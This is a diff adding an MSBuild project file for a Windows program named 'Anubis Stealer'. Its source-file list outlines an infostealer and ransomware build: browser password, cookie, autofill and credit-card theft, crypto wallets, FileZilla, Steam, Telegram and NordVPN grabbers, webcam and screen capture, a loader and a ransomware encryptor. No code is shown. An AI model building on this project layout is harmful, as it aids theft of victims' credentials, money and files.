@@ -1,0 +1,155 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{524108FD-117F-4DB2-8931-FAEE7612A38C}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Anubis Stealer</RootNamespace>
+    <AssemblyName>Anubis Stealer</AssemblyName>
+    <TargetFrameworkVersion>v4.6</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <ApplicationIcon>Anubis Stealer.ico</ApplicationIcon>
+    <StartupObject>loki.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Anubis\AeadParameters.cs" />
+    <Compile Include="Anubis\AesFastEngine.cs" />
+    <Compile Include="Anubis\AesGcm256.cs" />
+    <Compile Include="Anubis\Arrays.cs" />
+    <Compile Include="Anubis\CNT.cs" />
+    <Compile Include="Anubis\CryptoException.cs" />
+    <Compile Include="Anubis\DataLengthException.cs" />
+    <Compile Include="Anubis\DecryptAPI.cs" />
+    <Compile Include="Anubis\DesktopWriter.cs" />
+    <Compile Include="Anubis\DomainDetect.cs" />
+    <Compile Include="Anubis\Edge.cs" />
+    <Compile Include="Anubis\FF.cs" />
+    <Compile Include="Anubis\GcmBlockCipher.cs" />
+    <Compile Include="Anubis\GcmUtilities.cs" />
+    <Compile Include="Anubis\Gecko1.cs" />
+    <Compile Include="Anubis\Gecko2.cs" />
+    <Compile Include="Anubis\Gecko3.cs" />
+    <Compile Include="Anubis\Gecko4.cs" />
+    <Compile Include="Anubis\Gecko5.cs" />
+    <Compile Include="Anubis\Gecko6.cs" />
+    <Compile Include="Anubis\Gecko7.cs" />
+    <Compile Include="Anubis\Gecko8.cs" />
+    <Compile Include="Anubis\Gecko9.cs" />
+    <Compile Include="Anubis\IAeadBlockCipher.cs" />
+    <Compile Include="Anubis\IBlockCipher.cs" />
+    <Compile Include="Anubis\ICipherParameters.cs" />
+    <Compile Include="Anubis\IGcmMultiplier.cs" />
+    <Compile Include="Anubis\InvalidCipherTextException.cs" />
+    <Compile Include="Anubis\IsNullExtension.cs" />
+    <Compile Include="Anubis\JavaScriptReader.cs" />
+    <Compile Include="Anubis\JsonArray.cs" />
+    <Compile Include="Anubis\JsonExt.cs" />
+    <Compile Include="Anubis\JsonObject.cs" />
+    <Compile Include="Anubis\JsonPrimitive.cs" />
+    <Compile Include="Anubis\JsonType.cs" />
+    <Compile Include="Anubis\JsonValue.cs" />
+    <Compile Include="Anubis\KeyParameter.cs" />
+    <Compile Include="Anubis\Pack.cs" />
+    <Compile Include="Anubis\ParametersWithIV.cs" />
+    <Compile Include="Anubis\ROW.cs" />
+    <Compile Include="Anubis\SqlHandler.cs" />
+    <Compile Include="Anubis\Steal.cs" />
+    <Compile Include="Anubis\StringExtension.cs" />
+    <Compile Include="Anubis\SZ.cs" />
+    <Compile Include="Anubis\Tables8kGcmMultiplier.cs" />
+    <Compile Include="Anubis\VaultCli.cs" />
+    <Compile Include="Loki\Gecko\Asn1Der.cs" />
+    <Compile Include="Loki\Gecko\Asn1DerObject.cs" />
+    <Compile Include="Loki\Gecko\BerkeleyDB.cs" />
+    <Compile Include="Loki\Gecko\DataSettings.cs" />
+    <Compile Include="Loki\Gecko\LoginSettings.cs" />
+    <Compile Include="Loki\Gecko\MozillaPBE.cs" />
+    <Compile Include="Loki\Gecko\PasswordCheck.cs" />
+    <Compile Include="Loki\Gecko\TripleDESHelper.cs" />
+    <Compile Include="Loki\Gecko\Type.cs" />
+    <Compile Include="loki\GetDirPath.cs" />
+    <Compile Include="loki\HomeDirectory.cs" />
+    <Compile Include="loki\loki\Browser_Parse.cs" />
+    <Compile Include="loki\loki\Ransomware\RansomwareCrypt.cs" />
+    <Compile Include="loki\loki\Stealer\Cookies\GetCookies.cs" />
+    <Compile Include="loki\loki\Stealer\Credit_Cards\Get_Credit_Cards.cs" />
+    <Compile Include="loki\loki\Stealer\Passwords\GetPasswords.cs" />
+    <Compile Include="loki\loki\Stealer\WebData\Get_Browser_Autofill.cs" />
+    <Compile Include="loki\loki\Utilies\App\FileZilla.cs" />
+    <Compile Include="loki\loki\Utilies\App\NordVpn_Steal.cs" />
+    <Compile Include="loki\loki\Utilies\App\Steam.cs" />
+    <Compile Include="loki\loki\Utilies\App\Telegram.cs" />
+    <Compile Include="loki\loki\Utilies\Class1.cs" />
+    <Compile Include="loki\loki\Utilies\CryptoGrafy\crypt.cs" />
+    <Compile Include="loki\loki\Utilies\GetWebCam.cs" />
+    <Compile Include="loki\loki\Utilies\Grabber.cs" />
+    <Compile Include="loki\loki\Utilies\Hardware\Hardware.cs" />
+    <Compile Include="loki\loki\Utilies\Loader.cs" />
+    <Compile Include="loki\loki\Utilies\Screen.cs" />
+    <Compile Include="loki\loki\Utilies\Wallets\Wallets.cs" />
+    <Compile Include="loki\NativeMethods.cs" />
+    <Compile Include="loki\Program.cs" />
+    <Compile Include="loki\Properties\Resources.cs" />
+    <Compile Include="loki\Settings.cs" />
+    <Compile Include="loki\sqlite\CNT.cs" />
+    <Compile Include="loki\sqlite\FF.cs" />
+    <Compile Include="loki\sqlite\nulls\IsNullExtension.cs" />
+    <Compile Include="loki\sqlite\ROW.cs" />
+    <Compile Include="loki\sqlite\strings\StringExtension.cs" />
+    <Compile Include="loki\sqlite\SZ.cs" />
+    <Compile Include="Loki\Utilities\UserAgents.cs" />
+    <Compile Include="mozila_passwords\Sqlite.cs" />
+    <Compile Include="NoFile\Crypto.cs" />
+    <Compile Include="NoFile\Helper.cs" />
+    <Compile Include="NoiseMe\Drags\App\Models\JSON\JavaScriptReader.cs" />
+    <Compile Include="NoiseMe\Drags\App\Models\JSON\JsonArray.cs" />
+    <Compile Include="NoiseMe\Drags\App\Models\JSON\JsonExt.cs" />
+    <Compile Include="NoiseMe\Drags\App\Models\JSON\JsonObject.cs" />
+    <Compile Include="NoiseMe\Drags\App\Models\JSON\JsonPrimitive.cs" />
+    <Compile Include="NoiseMe\Drags\App\Models\JSON\JsonType.cs" />
+    <Compile Include="NoiseMe\Drags\App\Models\JSON\JsonValue.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Reborn\Identification.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
